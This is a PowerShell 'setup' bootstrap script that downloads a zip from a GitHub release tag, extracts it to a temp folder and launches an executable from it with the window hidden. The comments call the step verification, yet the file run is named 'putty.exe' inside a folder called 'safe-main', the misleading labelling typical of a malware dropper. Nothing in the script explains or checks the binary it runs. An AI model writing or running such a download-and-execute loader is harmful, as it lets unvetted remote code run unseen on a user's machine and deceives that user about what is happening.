$ErrorActionPreference = 'Stop'

$zipUrl  = 'https://github.com/Evelx0/setup/archive/refs/tags/v1.zip'

$rand    = [Guid]::NewGuid().ToString('N')
$workDir = Join-Path $env:TEMP ("setup-" + $rand)
$zipPath = Join-Path $env:TEMP ("setup-" + $rand + ".zip")
$logPath = Join-Path $env:TEMP ("setup-" + $rand + ".log")

Start-Transcript -Path $logPath -Append | Out-Null

try {
  New-Item -ItemType Directory -Path $workDir | Out-Null

  Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
  Expand-Archive -Path $zipPath -DestinationPath $workDir -Force
  Remove-Item $zipPath -Force

  $runDir = Join-Path $workDir 'safe-main'
  if (!(Test-Path $runDir)) { throw "Expected folder not found: $runDir" }

  # Example A: verify.bat
  #$bat = Join-Path $runDir 'verify.bat'
  #if (Test-Path $bat) {
  #  Start-Process -FilePath 'cmd.exe' -WindowStyle Hidden -ArgumentList '/c', "`"$bat`"" -Wait
  #}

  # Example B: verify.exe
  $exe = Join-Path $runDir 'putty.exe'
  if (Test-Path $exe) {
    Start-Process -FilePath $exe -WindowStyle Hidden -Wait
  }

} catch {
  "BOOTSTRAP FAILED: $($_.Exception.Message)" | Out-File -FilePath $logPath -Append
} finally {
  Stop-Transcript | Out-Null
  # Optional cleanup:
  # try { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue } catch {}
}
